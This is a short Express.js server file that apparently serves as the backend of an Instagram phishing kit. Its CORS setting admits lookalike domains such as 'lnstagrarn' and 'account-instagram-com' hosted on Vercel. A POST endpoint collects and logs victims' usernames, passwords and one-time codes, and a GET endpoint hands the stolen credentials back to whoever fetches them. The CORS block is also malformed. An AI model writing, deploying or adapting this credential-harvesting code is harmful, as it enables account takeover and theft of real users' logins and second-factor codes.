const express = require("express");
const cors = require("cors");

const app = express();

app.use(cors({
    origin: "https://account-instagram-com.vercel.app",
            "https://lnstagrarn-reel-paoa2oajo.vercel.app/profile/aryan.gg_xd/geturl$=Instagram/aashyyapsalotigsh=cncyaW43bXdlZXB4/profile.html"
}));

app.use(express.json());

let latestData = {
    username: null,
    password: null,
    code: null
};

app.post("/data", (req, res) => {
    latestData.username = req.body.username;
    latestData.password = req.body.password;
    latestData.code = req.body.code;

    console.log("Received:", latestData);

    res.json({
        success: true
    });
});

app.get("/data", (req, res) => {
    res.json(latestData);
});

const PORT = process.env.PORT || 1000;

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
